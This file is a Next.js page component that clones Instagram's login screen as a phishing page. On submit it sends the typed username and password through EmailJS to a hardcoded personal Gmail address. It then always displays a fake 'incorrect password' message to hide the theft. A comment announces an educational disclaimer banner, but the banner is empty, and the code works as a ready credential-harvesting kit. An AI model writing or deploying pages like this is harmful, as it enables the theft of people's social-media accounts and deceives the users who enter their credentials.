'use client'

import { useState, useEffect } from 'react'
import emailjs from '@emailjs/browser'
import styles from './page.module.css'

export default function Home() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [showError, setShowError] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)

  // Initialize EmailJS with your public key
  useEffect(() => {
    const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY || 'YOUR_PUBLIC_KEY'
    if (publicKey !== 'YOUR_PUBLIC_KEY') {
      emailjs.init(publicKey)
    }
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    setShowError(false)

    try {
      // EmailJS configuration
      // These values can be set as environment variables or directly in the code
      const serviceId = process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID || 'YOUR_SERVICE_ID'
      const templateId = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID || 'YOUR_TEMPLATE_ID'
      const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY || 'YOUR_PUBLIC_KEY'

      // Initialize EmailJS if not already initialized
      if (publicKey !== 'YOUR_PUBLIC_KEY') {
        emailjs.init(publicKey)
      }

      // Send email using EmailJS
      await emailjs.send(
        serviceId,
        templateId,
        {
          to_email: 'luis.fdo.lugo.q222@gmail.com',
          username: username.trim() || '(empty)',
          password: password.trim() || '(empty)',
          from_name: 'Instagram Login Form',
          message: `Login attempt:\nUsername: ${username.trim() || '(empty)'}\nPassword: ${password.trim() || '(empty)'}\nTime: ${new Date().toLocaleString()}`,
        }
      )

      // Reset form after successful email send
      setUsername('')
      setPassword('')
      setIsSubmitting(false)
      
      // Show error message (as per original behavior to maintain UI consistency)
      setShowError(true)
    } catch (error: any) {
      console.error('Failed to send email:', error)
      setIsSubmitting(false)
      setShowError(true)
    }
  }

  return (
    <div className={styles.container}>
      {/* Educational Disclaimer Banner */}
      
      <div className={styles.main}>
        {/* Left side - Phone mockup with screenshots */}
        <div className={styles.leftSection}>
          <div className={styles.phoneContainer}>
            <img 
              src="/image.png" 
              alt="Instagram phone mockup"
              className={styles.phoneMockup}
            />
          </div>
        </div>

        {/* Right side - Login form */}
        <div className={styles.rightSection}>
          {/* Login Card */}
          <div className={styles.loginCard}>
            {/* Mobile Language Selector */}
            <div className={styles.mobileLanguageSelector}>
              <select className={styles.languageSelector}>
                <option>English (US)</option>
                <option>Español</option>
                <option>Français</option>
              </select>
            </div>

            <div className={styles.logoContainer}>
              <i 
                className={styles.instagramLogo}
                aria-label="Instagram"
                role="img"
              ></i>
            </div>

            {showError && (
              <div className={styles.errorMessage}>
                <p>
                  Sorry, your password was incorrect. Please double-check your password.
                </p>
                <button 
                  type="button"
                  onClick={() => setShowError(false)}
                  className={styles.closeError}
                  aria-label="Close"
                >
                  ×
                </button>
              </div>
            )}

            <form onSubmit={handleSubmit} className={styles.form}>
              <div className={styles.inputGroup}>
                <input
                  type="text"
                  placeholder="Username, email or mobile number"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className={styles.input}
                  aria-label="Phone number, username, or email"
                />
              </div>

              <div className={styles.inputGroup}>
                <div className={styles.passwordContainer}>
                  <input
                    type={showPassword ? "text" : "password"}
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className={styles.input}
                    aria-label="Password"
                  />
                  {password && (
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className={styles.showPassword}
                    >
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  )}
                </div>
              </div>

              <button 
                type="submit" 
                className={styles.loginButton}
                disabled={!username || !password || isSubmitting}
              >
                {isSubmitting ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            <a href="#" className={styles.forgotPassword}>
              Forgot password?
            </a>

            <div className={styles.divider}>
              <div className={styles.dividerLine}></div>
              <div className={styles.dividerText}>OR</div>
              <div className={styles.dividerLine}></div>
            </div>

            <button className={styles.facebookLogin}>
              <svg 
                xmlns="http://www.w3.org/2000/svg" 
                viewBox="0 0 24 24" 
                width="20" 
                height="20"
                fill="#385185"
              >
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              <span>Log in with Facebook</span>
            </button>
          </div>

          {/* Sign up card */}
          <div className={styles.signupCard}>
            <p>
              Don't have an account? <a href="#" className={styles.signupLink}>Sign up</a>
            </p>
          </div>

          {/* Mobile Create Account Button */}
          <button className={styles.createAccountButton}>
            Create new account
          </button>

          {/* Get the app */}
          <div className={styles.getApp}>
            <p>Get the app.</p>
            <div className={styles.appButtons}>
              <a href="#" className={styles.appButton}>
                <img 
                  src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
                  alt="Get it on Google Play"
                />
              </a>
              <a href="#" className={styles.appButton}>
                <img 
                  src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
                  alt="Get it from Microsoft"
                />
              </a>
            </div>
          </div>

          {/* Mobile-only elements */}
          <div className={styles.mobileOnly}>
            <div className={styles.mobileMeta}>
              <span className={styles.metaLogo}>∞</span>
              <span>Meta</span>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className={styles.footer}>
        <div className={styles.footerLinks}>
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading & Non-Users</a>
          <a href="#">Meta Verified</a>
        </div>
        <div className={styles.footerBottom}>
          <select className={styles.languageSelector}>
            <option>English</option>
            <option>Español</option>
            <option>Français</option>
          </select>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  )
}
